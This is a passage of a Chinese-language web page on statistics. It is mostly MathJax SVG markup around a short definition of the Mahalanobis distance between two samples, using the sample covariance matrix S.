1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mo" transform="translate(1129.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2185.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(2463.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="msub" transform="translate(3653.8,0)"><g data-mml-node="mo"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="TeXAtom" transform="translate(311,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(878,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg></mjx-container>，其协方差矩阵记作S。样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>与样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.141ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 946.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>之间的马哈拉诺比斯距离定义为：</p><script type="math/tex; mode=display">d_{ij}=[(x_i-x_j)^\mathrm TS^{-1}(x_i-x_j)]^\frac12</script><p>其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="48.048ex" height="2.57ex" role="img" focusable="false" viewBox="0 -841.7 21237.2 1136"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1176.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2232.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(2621.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3874,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4318.7,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5571.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(6015.9,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(7354.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(7799.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(878,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msup" transform="translate(9319,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(10301.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(10746.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(11970.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(13026.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(13415.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(14714.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(15159.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(16459.5,0)"><path data-c="2C" 